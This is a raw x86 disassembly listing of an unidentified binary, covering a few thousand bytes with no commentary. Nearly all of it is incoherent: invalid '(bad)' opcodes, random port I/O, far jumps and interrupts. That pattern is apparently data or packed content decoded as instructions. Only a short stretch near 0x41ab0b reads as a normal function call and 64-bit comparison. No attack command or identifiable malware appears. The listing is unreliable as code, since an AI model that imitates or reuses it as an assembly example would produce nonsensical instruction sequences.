  41a737:	jmp    0x41ab06
  41a73c:	cmp    ebx,DWORD PTR [edi-0x7b]
  41a73f:	arpl   WORD PTR ds:0xe91f1b5b,sp
  41a745:	add    cl,BYTE PTR [ebx+0x7e]
  41a748:	mov    ?,WORD PTR [edi]
  41a74a:	xor    eax,0x16a5cf6a
  41a74f:	sbb    BYTE PTR [edx+edx*1+0x67a61818],bh
  41a756:	jp     0x41a77e
  41a758:	sbb    cl,BYTE PTR [edi+0x70]
  41a75b:	pop    ss
  41a75c:	dec    edi
  41a75d:	lds    eax,FWORD PTR ds:0x6b4c3561
  41a763:	mov    cl,0x30
  41a765:	push   cs
  41a766:	retf   
  41a767:	mov    al,ds:0x1de8f7ef
  41a76c:	pop    es
  41a76d:	mov    ch,0x9
  41a76f:	out    dx,eax
  41a770:	add    eax,0xe1876af8
  41a775:	stos   BYTE PTR es:[edi],al
  41a776:	push   esi
  41a777:	cwde   
  41a778:	nop
  41a779:	mov    ch,0xbd
  41a77b:	hlt    
  41a77c:	daa    
  41a77d:	push   edx
  41a77e:	or     DWORD PTR [ebx-0x46],0xffffffef
  41a782:	popa   
  41a783:	clc    
  41a784:	aas    
  41a785:	shr    esi,1
  41a787:	mov    ah,0x7
  41a789:	in     eax,dx
  41a78a:	imul   edx,DWORD PTR [edx-0x6a],0xffffff97
  41a78e:	jl     0x41a7e5
  41a790:	stc    
  41a791:	fild   DWORD PTR [ecx]
  41a793:	or     BYTE PTR [esi],ch
  41a795:	ffreep st(7)
  41a797:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a798:	enter  0xc81,0x62
  41a79c:	aad    0xcd
  41a79e:	xor    eax,0x8eff74d3
  41a7a3:	aam    0xe9
  41a7a5:	shr    BYTE PTR [ebp-0x13],0xc
  41a7a9:	cmc    
  41a7aa:	aad    0x37
  41a7ac:	addr16 or al,0x61
  41a7af:	inc    ecx
  41a7b0:	outs   dx,DWORD PTR ds:[esi]
  41a7b1:	ret    0x6536
  41a7b4:	pop    esp
  41a7b5:	pop    es
  41a7b6:	xchg   edx,eax
  41a7b7:	aas    
  41a7b8:	repnz in eax,dx
  41a7ba:	lock jae 0x41a7bf
  41a7bd:	pop    eax
  41a7be:	or     DWORD PTR [ecx],eax
  41a7c0:	adc    eax,ebp
  41a7c2:	inc    esi
  41a7c3:	add    BYTE PTR [ebp+0x4934efa3],0xf1
  41a7ca:	ja     0x41a839
  41a7cc:	imul   ebp,DWORD PTR [esi-0x1699e867],0xfffffff5
  41a7d3:	aas    
  41a7d4:	jle    0x41a83c
  41a7d6:	adc    DWORD PTR [ebx],0x1c
  41a7d9:	fcmovne st,st(6)
  41a7db:	inc    ecx
  41a7dc:	pop    esi
  41a7dd:	pop    ds
  41a7de:	or     BYTE PTR [ebp+ebx*8+0x7533de0b],cl
  41a7e5:	or     BYTE PTR [eax],ch
  41a7e7:	pusha  
  41a7e8:	pushf  
  41a7e9:	fdivr  QWORD PTR [esi-0x39]
  41a7ec:	stos   DWORD PTR es:[edi],eax
  41a7ed:	int    0xc4
  41a7ef:	arpl   WORD PTR [ebx-0x4e6f6e4a],bp
  41a7f5:	push   ds
  41a7f6:	xchg   esi,eax
  41a7f7:	add    eax,edx
  41a7f9:	jne    0x41a7dc
  41a7fb:	daa    
  41a7fc:	enter  0x6185,0xa3
  41a800:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a801:	push   esp
  41a802:	inc    esp
  41a803:	pusha  
  41a804:	mov    edi,0xb58bb826
  41a809:	jmp    0x41a818
  41a80b:	cmp    esp,DWORD PTR [ebp+ecx*2-0x76adbd6c]
  41a812:	xor    ah,0x4b
  41a815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a816:	imul   eax,DWORD PTR [eax+ebp*1],0xffffff81
  41a81a:	jno    0x41a848
  41a81c:	dec    ebp
  41a81d:	mov    esi,0x89e480c
  41a822:	push   ss
  41a823:	scas   eax,DWORD PTR es:[edi]
  41a824:	outs   dx,DWORD PTR ds:[esi]
  41a826:	repz pop ebx
  41a828:	mov    edx,0x51831a42
  41a82d:	jb     0x41a848
  41a82f:	dec    edx
  41a830:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a831:	or     dh,BYTE PTR [ecx+eiz*1+0x6648c8f7]
  41a838:	add    ah,cl
  41a83a:	sahf   
  41a83b:	(bad)  
  41a83c:	loop   0x41a870
  41a83e:	mov    al,0x45
  41a840:	repnz adc DWORD PTR [ebx+0x25],edi
  41a844:	fst    QWORD PTR [ebp+0xfa6c372]
  41a84a:	mov    ecx,0xf6de4ae3
  41a84f:	xor    esi,eax
  41a851:	rcr    esi,1
  41a853:	bound  edi,QWORD PTR [eax]
  41a855:	inc    edx
  41a856:	loope  0x41a841
  41a858:	loop   0x41a806
  41a85a:	cmp    BYTE PTR [ecx+0x50],dh
  41a85d:	pop    esi
  41a85e:	neg    BYTE PTR [esi]
  41a860:	xchg   edi,ecx
  41a862:	mov    ebp,0x3e070697
  41a867:	or     bh,BYTE PTR [edi+0x20]
  41a86a:	jl     0x41a86f
  41a86c:	dec    edx
  41a86d:	add    al,0x6
  41a86f:	sti    
  41a870:	mov    ebx,0x451bdae0
  41a875:	fwait
  41a876:	add    esi,DWORD PTR [edx-0x60e73756]
  41a87c:	mov    ecx,0xc61ce270
  41a881:	in     eax,0xf8
  41a883:	clc    
  41a884:	push   ecx
  41a885:	loopne 0x41a859
  41a887:	jb     0x41a8dc
  41a889:	or     eax,DWORD PTR [ebx-0x651274d]
  41a88f:	pop    ds
  41a890:	adc    DWORD PTR [ecx-0x5f79877f],ebp
  41a896:	addr16 iret 
  41a898:	fwait
  41a899:	pushf  
  41a89a:	call   0xa445:0x92ebc9a0
  41a8a1:	pop    ds
  41a8a2:	ss loopne 0x41a8c4
  41a8a5:	fld    QWORD PTR ds:0x3f59c16b
  41a8ab:	sub    al,0x15
  41a8ad:	push   ds
  41a8ae:	lea    ebx,ds:0x2edf3c60
  41a8b4:	ins    DWORD PTR es:[edi],dx
  41a8b5:	test   BYTE PTR [edx+0x64a3df3e],cl
  41a8bb:	dec    edi
  41a8bc:	fadd   DWORD PTR [ebx]
  41a8be:	xchg   ecx,eax
  41a8bf:	stos   DWORD PTR es:[edi],eax
  41a8c0:	mov    DWORD PTR [edx-0x6d],ebx
  41a8c3:	ss (bad) 
  41a8c5:	sti    
  41a8c6:	jmp    0xbd1bb845
  41a8cb:	sbb    cl,BYTE PTR [ebx+edi*4+0x14131b54]
  41a8d2:	xlat   BYTE PTR ds:[ebx]
  41a8d3:	sbb    DWORD PTR [esi+0xe],edx
  41a8d6:	or     BYTE PTR [esi],ch
  41a8d8:	inc    edi
  41a8d9:	pop    esi
  41a8da:	cmp    al,0x21
  41a8dc:	retf   0xb1ba
  41a8df:	mov    ebx,0x1bd42d19
  41a8e4:	cmp    edx,DWORD PTR [edi-0x280ab55f]
  41a8ea:	adc    DWORD PTR [eax+0x3aff8c92],esp
  41a8f0:	fisubr DWORD PTR [edx]
  41a8f2:	cmc    
  41a8f3:	out    0x3c,eax
  41a8f5:	sar    BYTE PTR [esi+eiz*1+0x4c],cl
  41a8f9:	push   esp
  41a8fa:	or     DWORD PTR [esi+0x30fd2737],edi
  41a900:	mov    WORD PTR [edi-0x17],?
  41a903:	popa   
  41a904:	clc    
  41a905:	ss sbb eax,0x2b7ee34b
  41a90b:	xchg   ecx,eax
  41a90c:	mov    ds:0x45654c5f,eax
  41a911:	clc    
  41a912:	adc    ebx,DWORD PTR [esi+edi*8+0x28]
  41a916:	dec    edi
  41a917:	stos   DWORD PTR es:[edi],eax
  41a918:	sub    eax,0x7e0a1ba9
  41a91d:	mov    dh,0xdd
  41a91f:	cli    
  41a920:	hlt    
  41a921:	inc    ebp
  41a922:	adc    BYTE PTR [edi-0x4c],al
  41a925:	push   edi
  41a926:	repnz or ebp,DWORD PTR [ebx-0x660a789]
  41a92d:	ja     0x41a97c
  41a92f:	jle    0x41a8f0
  41a931:	dec    ebp
  41a932:	xor    eax,0xa295a21
  41a937:	pop    esp
  41a938:	js     0x41a937
  41a93a:	push   edx
  41a93b:	dec    eax
  41a93c:	pop    edi
  41a93d:	sbb    eax,0xb5bc9ccd
  41a942:	inc    edi
  41a943:	iret   
  41a944:	or     al,dl
  41a946:	xor    edi,eax
  41a948:	ret    0xf91
  41a94b:	sar    bl,cl
  41a94d:	cmp    edi,DWORD PTR [ecx-0x60]
  41a950:	push   edi
  41a951:	mov    bl,0xcb
  41a953:	cmp    bl,al
  41a955:	dec    ebx
  41a956:	adc    eax,DWORD PTR [ebx-0x2604ec38]
  41a95c:	pop    edi
  41a95d:	xchg   ecx,eax
  41a95e:	outs   dx,BYTE PTR ds:[esi]
  41a95f:	int    0x48
  41a961:	mov    esi,0xe9796e8a
  41a966:	or     eax,0x8012544c
  41a96b:	inc    esp
  41a96c:	in     eax,dx
  41a96d:	xor    al,0x1a
  41a96f:	out    0x3a,eax
  41a971:	sti    
  41a972:	xchg   BYTE PTR [ecx+0x67],ah
  41a975:	fidivr WORD PTR ds:0x3a4b360a
  41a97b:	mov    eax,ds:0xbf2748ea
  41a980:	inc    edx
  41a981:	aaa    
  41a982:	xlat   BYTE PTR ds:[ebx]
  41a983:	stos   BYTE PTR es:[edi],al
  41a984:	bound  eax,QWORD PTR [esp+edi*2-0x7099ba5c]
  41a98b:	pusha  
  41a98c:	addr16 lock mov edx,?
  41a990:	xchg   ebx,eax
  41a991:	xchg   ebx,eax
  41a992:	shl    ch,0xea
  41a995:	cli    
  41a996:	ins    BYTE PTR es:[edi],dx
  41a997:	pop    esi
  41a998:	in     eax,dx
  41a999:	and    bh,al
  41a99b:	push   esi
  41a99c:	push   ecx
  41a99d:	xor    eax,0xd4092752
  41a9a2:	xchg   esi,eax
  41a9a3:	inc    esp
  41a9a4:	fsub   st,st(6)
  41a9a6:	cs stos BYTE PTR es:[edi],al
  41a9a8:	mov    al,ds:0xa77d1cf5
  41a9ad:	retf   
  41a9ae:	cmp    ah,BYTE PTR [ecx-0x32]
  41a9b1:	xor    dl,BYTE PTR [ebx+esi*8]
  41a9b4:	xor    BYTE PTR [ebx+0x55],dh
  41a9b7:	add    esp,eax
  41a9b9:	fld    QWORD PTR [eax+0x1390db10]
  41a9bf:	push   ebp
  41a9c0:	loop   0x41a94e
  41a9c2:	sbb    edi,DWORD PTR [ecx]
  41a9c4:	lahf   
  41a9c5:	lock push ecx
  41a9c7:	xor    BYTE PTR [ebp-0x2371a8e1],al
  41a9cd:	shl    BYTE PTR [edi],cl
  41a9cf:	sbb    al,0x16
  41a9d1:	outs   dx,BYTE PTR ds:[esi]
  41a9d2:	sbb    DWORD PTR [esi-0x12a16ed2],ebp
  41a9d8:	push   ds
  41a9d9:	cmp    bh,BYTE PTR [ebx]
  41a9db:	shl    esi,1
  41a9dd:	out    0x53,eax
  41a9df:	leave  
  41a9e0:	mov    ds:0x256fd8e6,eax
  41a9e5:	push   es
  41a9e6:	dec    ecx
  41a9e7:	loopne 0x41a977
  41a9e9:	(bad)  
  41a9ea:	fild   WORD PTR [edx-0x3f0346a8]
  41a9f0:	inc    esp
  41a9f1:	add    al,0xf9
  41a9f3:	inc    esi
  41a9f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9f5:	and    al,0xd0
  41a9f7:	(bad)  
  41a9f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9f9:	fisttp WORD PTR [edx]
  41a9fb:	(bad)
  41a9ff:	cmp    DWORD PTR [ebx],0x8a0bf66f
  41aa05:	mov    bh,BYTE PTR [esi-0x6b6acb6d]
  41aa0b:	icebp  
  41aa0c:	add    al,0xe
  41aa0e:	fnstenv ds:0xa1fe10b1
  41aa14:	mov    ebp,0x85bf7b30
  41aa19:	std    
  41aa1a:	iret   
  41aa1b:	mov    ebx,DWORD PTR es:[esi-0x6f]
  41aa1f:	clc    
  41aa20:	mov    ah,0x7
  41aa22:	xchg   edx,eax
  41aa23:	in     al,dx
  41aa24:	xor    edx,DWORD PTR [eax+esi*1+0x32]
  41aa28:	ins    DWORD PTR es:[edi],dx
  41aa29:	or     eax,DWORD PTR [eax-0x25]
  41aa2c:	into   
  41aa2d:	sbb    ecx,ecx
  41aa2f:	push   edi
  41aa30:	sahf   
  41aa31:	movlps QWORD PTR [ecx+0x4374311],xmm1
  41aa38:	int    0xe6
  41aa3a:	push   0x60
  41aa3c:	sti    
  41aa3d:	sub    edx,DWORD PTR [esi+ebx*1+0x16]
  41aa41:	sub    DWORD PTR [ecx-0xb],edi
  41aa44:	xor    BYTE PTR [edi-0x79fd1573],ah
  41aa4a:	xchg   esp,eax
  41aa4b:	pop    ebx
  41aa4c:	bound  ebx,QWORD PTR [ebp-0x18e772a6]
  41aa52:	fist   DWORD PTR [ecx-0x72]
  41aa55:	or     ebp,DWORD PTR fs:[edi+0xdd14c99]
  41aa5c:	mov    al,BYTE PTR [ecx]
  41aa5e:	and    al,0x33
  41aa60:	leave  
  41aa61:	mov    esp,eax
  41aa63:	cmc    
  41aa64:	cld    
  41aa65:	sbb    eax,0xce4a6df6
  41aa6a:	inc    ebp
  41aa6b:	push   ss
  41aa6c:	add    bl,dh
  41aa6e:	loopne 0x41aa83
  41aa70:	mov    WORD PTR [eax+0x1a1c73f],?
  41aa76:	mov    DWORD PTR [edi-0x100f3cac],edx
  41aa7c:	adc    al,0x79
  41aa7e:	push   ds
  41aa7f:	inc    esp
  41aa80:	stc    
  41aa81:	cld    
  41aa82:	retf   0xa647
  41aa85:	cwde   
  41aa86:	lods   eax,DWORD PTR ds:[esi]
  41aa87:	leave  
  41aa88:	mov    ds:0x59e1c2c2,al
  41aa8d:	mov    ecx,0x15c46e66
  41aa92:	mov    esi,0xaaf05e87
  41aa97:	xchg   ebp,eax
  41aa98:	xchg   edx,eax
  41aa99:	inc    esi
  41aa9a:	ds cs mov edi,0xee4b7ed
  41aaa1:	shl    BYTE PTR ds:0xfb4fbeac,0xb7
  41aaa8:	push   ebx
  41aaa9:	test   al,0xbc
  41aaab:	cwde   
  41aaac:	sar    BYTE PTR [edx-0x7d],0xe8
  41aab0:	pop    ebp
  41aab1:	pop    ebx
  41aab2:	ss aas 
  41aab4:	mov    dh,0xf3
  41aab6:	or     eax,0x4e354cb3
  41aabb:	mov    eax,ds:0x568e35cd
  41aac0:	inc    ebp
  41aac1:	sbb    al,0x78
  41aac3:	ins    BYTE PTR es:[edi],dx
  41aac4:	fst    st(2)
  41aac6:	dec    esp
  41aac7:	fistp  DWORD PTR [edi]
  41aac9:	fimul  WORD PTR ds:0xceaea0d3
  41aacf:	imul   ebp,DWORD PTR [ebp-0x97421b5],0x40
  41aad6:	aam    0x1d
  41aad8:	adc    ch,ch
  41aada:	add    al,0xa4
  41aadc:	lahf   
  41aadd:	sub    eax,0x6798df3
  41aae2:	mov    DWORD PTR [ecx+0x44],ebp
  41aae5:	dec    edi
  41aae6:	repnz adc bh,bh
  41aae9:	test   DWORD PTR [ebx-0x9],ecx
  41aaec:	mov    al,ds:0xd224a50
  41aaf1:	in     al,dx
  41aaf2:	in     eax,dx
  41aaf3:	jmp    0x665e:0xfcf9d481
  41aafa:	pop    ecx
  41aafb:	test   eax,ebx
  41aafd:	iret   
  41aafe:	retf   0xcfc3
  41ab01:	cmp    ah,BYTE PTR [edi]
  41ab03:	sti    
  41ab04:	push   es
  41ab05:	bound  ecx,QWORD PTR [ebx+0x5334245c]
  41ab0b:	push   ecx
  41ab0c:	push   edx
  41ab0d:	push   eax
  41ab0e:	call   0x4220b4
  41ab13:	mov    ecx,DWORD PTR [esp+0x48]
  41ab17:	mov    ebx,DWORD PTR [esp+0x4c]
  41ab1b:	push   ebx
  41ab1c:	push   ecx
  41ab1d:	push   edx
  41ab1e:	push   eax
  41ab1f:	call   0x4220b4
  41ab24:	mov    ecx,DWORD PTR [esp+0x50]
  41ab28:	mov    ebx,DWORD PTR [esp+0x54]
  41ab2c:	add    eax,ecx
  41ab2e:	mov    ecx,DWORD PTR [esp+0x88]
  41ab35:	adc    edx,ebx
  41ab37:	mov    ebx,DWORD PTR [esp+0x8c]
  41ab3e:	cmp    ecx,eax
  41ab40:	jne    0x41af1d
  41ab46:	cmp    ebx,edx
  41ab48:	jmp    0x41af17
  41ab4d:	xchg   esi,eax
  41ab4e:	loope  0x41ab41
  41ab50:	gs pop esi
  41ab52:	fs jp  0x41ab2f
  41ab55:	aam    0x4d
  41ab57:	imul   esi,DWORD PTR [eax-0x551c2ca4],0x72
  41ab5e:	lahf   
  41ab5f:	push   ss
  41ab60:	sbb    BYTE PTR [edx+edx*1-0x98fe7e8],bh
  41ab67:	inc    ebp
  41ab68:	sub    ebp,esi
  41ab6a:	ret    
  41ab6b:	xor    eax,0xa306d04d
  41ab70:	repz arpl WORD PTR [ebp+0x205022e3],sp
  41ab77:	out    dx,al
  41ab78:	pop    eax
  41ab79:	cdq    
  41ab7a:	jp     0x41abf1
  41ab7c:	cmp    edi,0xa9310f59
  41ab82:	outs   dx,DWORD PTR ds:[esi]
  41ab83:	sub    ch,BYTE PTR [edi-0x7e]
  41ab86:	(bad)  
  41ab88:	push   0x79558409
  41ab8d:	lds    esi,FWORD PTR [ecx-0x4c]
  41ab90:	andnps xmm6,XMMWORD PTR [ecx]
  41ab93:	std    
  41ab94:	ins    BYTE PTR es:[edi],dx
  41ab95:	xchg   edi,eax
  41ab96:	retf   
  41ab97:	jl     0x41ab51
  41ab99:	mov    ah,0x2b
  41ab9b:	loope  0x41ac15
  41ab9d:	mov    ds:0xcfd06637,eax
  41aba2:	cmp    bh,BYTE PTR [edi]
  41aba4:	dec    ebp
  41aba5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aba6:	jmp    0x69d3:0x331711b9
  41abad:	rcl    DWORD PTR [eax+0x17],0xbb
  41abb1:	int    0x37
  41abb3:	mov    ds:0xe042cdcd,al
  41abb8:	mov    ds:0x25eeadb0,eax
  41abbd:	jmp    0x41abe9
  41abbf:	add    al,BYTE PTR cs:[si-0x6647]
  41abc5:	mov    bl,0x42
  41abc7:	repnz int3 
  41abc9:	cwde   
  41abca:	retf   0x85de
  41abcd:	prefetch BYTE PTR [ebp-0x7753413]
  41abd4:	pop    ebp
  41abd5:	int    0x90
  41abd7:	in     eax,dx
  41abd8:	cmp    DWORD PTR [ecx+0x47],esi
  41abdb:	mov    DWORD PTR [ebp+0x73],ebp
  41abde:	add    eax,0x4524f698
  41abe3:	stos   DWORD PTR es:[edi],eax
  41abe4:	rol    BYTE PTR [edi+esi*8],1
  41abe7:	pusha  
  41abe8:	cmp    eax,0xd300ac04
  41abed:	jecxz  0x41abe7
  41abef:	arpl   cx,ax
  41abf1:	dec    edx
  41abf2:	pusha  
  41abf3:	(bad)  
  41abf4:	bnd jp 0x41abd8
  41abf7:	(bad)  
  41abf8:	lods   eax,DWORD PTR ds:[esi]
  41abf9:	inc    ebp
  41abfa:	pushf  
  41abfb:	fsubr  DWORD PTR [ebp+0x79e5a84f]
  41ac01:	icebp  
  41ac02:	mov    al,ds:0xefb296b7
  41ac07:	sbb    DWORD PTR [edi-0x6ecb9cd5],esi
  41ac0d:	mov    eax,0x13c2431c
  41ac12:	or     al,0xeb
  41ac14:	mov    al,bh
  41ac16:	and    eax,ebx
  41ac18:	add    esp,DWORD PTR [eax]
  41ac1a:	cmp    al,0x40
  41ac1c:	sbb    BYTE PTR [ecx-0x18530549],ah
  41ac22:	cmp    eax,0x624fdf59
  41ac27:	loopne 0x41ac8f
  41ac29:	add    BYTE PTR [edi],0x82
  41ac2c:	sbb    bh,BYTE PTR [edi+0x5af42304]
  41ac32:	popaw  
  41ac34:	ds inc eax
  41ac36:	ret    
  41ac37:	fbld   TBYTE PTR [ebx]
  41ac39:	inc    eax
  41ac3a:	js     0x41abd2
  41ac3c:	lods   eax,DWORD PTR ds:[esi]
  41ac3d:	aaa    
  41ac3e:	dec    ebp
  41ac3f:	adc    DWORD PTR [esi-0x3237d958],0x7663fbb9
  41ac49:	xchg   ecx,eax
  41ac4a:	jmp    DWORD PTR [ecx-0x65]
  41ac4d:	(bad)  
  41ac4e:	mov    dh,0xc2
  41ac50:	adc    al,0xae
  41ac52:	inc    edx
  41ac53:	loope  0x41ac66
  41ac55:	pop    eax
  41ac56:	hlt    
  41ac57:	or     DWORD PTR [eax+0x710c4282],0x61
  41ac5e:	jb     0x41ac95
  41ac60:	test   al,0x81
  41ac62:	jno    0x41acc1
  41ac64:	push   0x19b9ad75
  41ac69:	push   ebp
  41ac6a:	lods   al,BYTE PTR ds:[esi]
  41ac6b:	fcom   DWORD PTR [esi]
  41ac6d:	(bad)  
  41ac6e:	out    dx,eax
  41ac6f:	push   0x27d90b2c
  41ac74:	dec    ecx
  41ac75:	add    esp,0x78
  41ac78:	dec    ecx
  41ac79:	xchg   ecx,eax
  41ac7a:	mov    edx,0x55583d2b
  41ac7f:	icebp  
  41ac80:	or     al,BYTE PTR [ebx]
  41ac82:	rcl    ah,0x4c
  41ac85:	add    eax,0xf6254c17
  41ac8a:	repnz int3 
  41ac8c:	xchg   DWORD PTR [edi],edx
  41ac8e:	dec    esp
  41ac8f:	xor    DWORD PTR [edi],edi
  41ac91:	out    0x73,al
  41ac93:	jecxz  0x41ad0e
  41ac95:	es mov ecx,0xb5a59101
  41ac9b:	faddp  st(6),st
  41ac9d:	xlat   BYTE PTR ds:[ebx]
  41ac9e:	xchg   ebx,eax
  41ac9f:	sbb    ecx,esp
  41aca1:	outs   dx,DWORD PTR ds:[esi]
  41aca2:	cld    
  41aca3:	pop    edx
  41aca4:	test   eax,0xa6d3071a
  41aca9:	or     DWORD PTR [ebx],edi
  41acab:	push   0xffffffc0
  41acad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acae:	inc    esp
  41acaf:	shr    esp,1
  41acb1:	mov    bl,0xbe
  41acb3:	mov    bh,0x97
  41acb5:	sbb    esi,DWORD PTR [ecx+0x56b248e1]
  41acbb:	jb     0x41ad30
  41acbd:	popa   
  41acbe:	dec    ebp
  41acbf:	add    eax,0x68a92850
  41acc4:	out    0xec,eax
  41acc6:	ret    
  41acc7:	cli    
  41acc8:	xchg   esi,eax
  41acc9:	fwait
  41acca:	jge    0x41ac67
  41accc:	push   edx
  41accd:	dec    eax
  41acce:	pop    ecx
  41accf:	or     al,0x70
  41acd1:	xlat   BYTE PTR ds:[ebx]
  41acd2:	mov    ah,BYTE PTR [ebx]
  41acd4:	(bad)  
  41acd5:	fld    TBYTE PTR [edi]
  41acd7:	push   ss
  41acd8:	aas    
  41acd9:	xlat   BYTE PTR ds:[ebx]
  41acda:	shl    DWORD PTR [ecx+0x4aae3523],1
  41ace0:	iret   
  41ace1:	or     BYTE PTR [edx-0x38904705],0xa
  41ace8:	outs   dx,BYTE PTR ds:[esi]
  41ace9:	sub    dl,BYTE PTR [ecx]
  41aceb:	(bad)  
  41acee:	aas    
  41acef:	data16 sub al,0x3a
  41acf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acf4:	stos   DWORD PTR es:[edi],eax
  41acf5:	xor    al,0x33
  41acf7:	sbb    esi,eax
  41acf9:	addr16 pop es
  41acfb:	and    DWORD PTR [edi],esp
  41acfd:	add    edx,ecx
  41acff:	cmp    DWORD PTR [esi-0x38fef524],esp
  41ad05:	shl    DWORD PTR [esi-0x4a],cl
  41ad08:	sbb    BYTE PTR [eax-0x71aa8042],ch
  41ad0e:	push   eax
  41ad0f:	pusha  
  41ad10:	sub    eax,0x3b289afc
  41ad15:	xchg   esi,eax
  41ad16:	push   edi
  41ad17:	dec    eax
  41ad18:	push   esi
  41ad19:	or     eax,0x9d79b01f
  41ad1e:	call   0x8da2:0x206e43da
  41ad25:	xor    BYTE PTR [ecx],0x73
  41ad28:	jecxz  0x41ad2a
  41ad2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad2b:	lea    ebx,ds:0x31e05cf3
  41ad31:	rcr    eax,cl
  41ad33:	or     DWORD PTR [ecx],0x363710e1
  41ad39:	cmp    DWORD PTR [eax],eax
  41ad3b:	leave  
  41ad3c:	pop    es
  41ad3d:	cdq    
  41ad3e:	cmp    eax,DWORD PTR [edi+eax*1]
  41ad41:	cmp    DWORD PTR [edi-0x14e54adc],ebx
  41ad47:	mov    ebp,0x40e1ab0
  41ad4c:	fcmovnb st,st(5)
  41ad4e:	cmc    
  41ad4f:	gs cmp eax,0xa5f56ed8
  41ad55:	pop    DWORD PTR [ecx+0x56]
  41ad58:	sub    ebx,DWORD PTR [eax]
  41ad5a:	rcl    dh,1
  41ad5c:	jbe    0x41ad00
  41ad5e:	cmp    eax,0xfac951c4
  41ad63:	ror    DWORD PTR [eax],1
  41ad65:	into   
  41ad66:	cmp    DWORD PTR [ebp+0xb429ee4],edx
  41ad6c:	xchg   esp,eax
  41ad6d:	push   esp
  41ad6e:	add    eax,0x5aaa92ce
  41ad73:	jp     0x41ad5d
  41ad75:	loope  0x41ad5b
  41ad77:	cwde   
  41ad78:	mov    cl,0xb
  41ad7a:	mov    ch,0x79
  41ad7c:	or     eax,0x445854bc
  41ad81:	mov    edx,0x88e925ed
  41ad86:	ficomp DWORD PTR [ecx+0x2553b526]
  41ad8c:	or     BYTE PTR [esi-0x45],al
  41ad8f:	xchg   esp,eax
  41ad90:	fcmovb st,st(1)
  41ad92:	add    ebp,DWORD PTR [edx+ecx*2-0x5d]
  41ad96:	sub    eax,0x1c030f15
  41ad9b:	and    DWORD PTR [si+0x6],ebp
  41ad9f:	cs arpl di,dx
  41ada2:	jo     0x41ad85
  41ada4:	jecxz  0x41ad6d
  41ada6:	sub    DWORD PTR [eax],ecx
  41ada8:	div    BYTE PTR [eax+ebp*4-0x1b2f0a8f]
  41adaf:	adc    ax,0xcddf
  41adb3:	aam    0xab
  41adb5:	aas    
  41adb6:	out    0x6c,eax
  41adb8:	dec    ebx
  41adb9:	add    BYTE PTR [eax+0x37],ch
  41adbc:	loopne 0x41ae19
  41adbe:	ins    DWORD PTR es:[edi],dx
  41adbf:	cmc    
  41adc0:	pusha  
  41adc1:	cmp    eax,DWORD PTR [ebp+0x3f]
  41adc4:	shr    BYTE PTR [edi],0x3f
  41adc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adc8:	sub    BYTE PTR [esi],bl
  41adca:	out    dx,eax
  41adcb:	or     bl,dh
  41adcd:	inc    esp
  41adce:	pop    edx
  41adcf:	sub    al,0xfa
  41add1:	xor    eax,0xa98e013d
  41add6:	das    
  41add7:	sbb    eax,0xdb2c9a31
  41addc:	add    DWORD PTR [esi+ebp*1],eax
  41addf:	fdiv   DWORD PTR [edx-0x28]
  41ade2:	sub    BYTE PTR [ecx],0x58
  41ade5:	and    esi,DWORD PTR [esi+ebp*1-0x45eb80f5]
  41adec:	iret   
  41aded:	mov    esi,0xb7211f87
  41adf2:	jnp    0x41ae18
  41adf4:	in     eax,0x5a
  41adf6:	lea    eax,[ebx]
  41adf8:	or     eax,ebx
  41adfa:	or     BYTE PTR [eax-0x69cc11df],al
  41ae00:	mov    es,edx
  41ae02:	add    eax,0x98c623db
  41ae07:	dec    ebp
  41ae08:	in     al,dx
  41ae09:	jnp    0x41ae1a
  41ae0b:	hlt    
  41ae0c:	xchg   esp,eax
  41ae0d:	cwde   
  41ae0e:	leave  
  41ae0f:	out    dx,eax
  41ae10:	mov    ?,WORD PTR [ebx+0x71]
  41ae13:	mov    esp,0x25b1475c
  41ae18:	cmc    
  41ae19:	cdq    
  41ae1a:	std    
  41ae1b:	pusha  
  41ae1c:	ss cwde 
  41ae1e:	aaa    
  41ae1f:	call   0xe568:0x6628a0e4
  41ae26:	push   0xfffffffd
  41ae28:	aad    0x4c
  41ae2a:	push   0xdbcf07b1
  41ae2f:	jae    0x41addc
  41ae31:	push   ecx
  41ae32:	adc    ecx,esi
  41ae34:	jp     0x41ae37
  41ae36:	xchg   BYTE PTR [ebx+edx*1+0x26],dh
  41ae3a:	pop    edi
  41ae3b:	int    0x6d
  41ae3d:	ficom  WORD PTR [ebx+0x33da9ef0]
  41ae44:	iret   
  41ae45:	cmp    BYTE PTR [edi+0x30],0x6e
  41ae49:	out    dx,al
  41ae4a:	push   cs
  41ae4b:	jmp    0xd5ec:0x3d92fe84
  41ae52:	shl    BYTE PTR [esi+0x6bf49aea],1
  41ae58:	adc    DWORD PTR [edi+ecx*2-0x8],ecx
  41ae5c:	dec    edx
  41ae5d:	test   DWORD PTR [eax],ecx
  41ae5f:	imul   ebx,DWORD PTR [edi-0x3bad7e1e],0x11f633c4
  41ae69:	or     esi,DWORD PTR [ebx-0x6f]
  41ae6c:	test   BYTE PTR [edx+0x20],0x67
  41ae70:	add    ebp,esp
  41ae72:	scas   al,BYTE PTR es:[edi]
  41ae73:	sbb    BYTE PTR [eax-0x5a],ch
  41ae76:	jne    0x41ae26
  41ae78:	(bad)  
  41ae79:	pop    edi
  41ae7a:	sbb    dh,bh
  41ae7c:	xchg   ebx,eax
  41ae7d:	addr16 int3 
  41ae7f:	mov    ?,WORD PTR [edx-0x5d]
  41ae82:	in     al,dx
  41ae83:	xchg   ebp,eax
  41ae84:	cdq    
  41ae85:	fst    QWORD PTR [esi-0x168e2b38]
  41ae8b:	int3   
  41ae8c:	aaa    
  41ae8d:	pop    ebp
  41ae8e:	sub    al,0xee
  41ae90:	jmp    0x5ec9:0x8cb21f71
  41ae97:	fstp   QWORD PTR [edx-0x73]
  41ae9a:	aad    0x1a
  41ae9c:	mov    ecx,0xf33340e9
  41aea1:	icebp  
  41aea2:	adc    dh,BYTE PTR [ebp-0x24]
  41aea5:	mov    ds:0x17a4274d,al
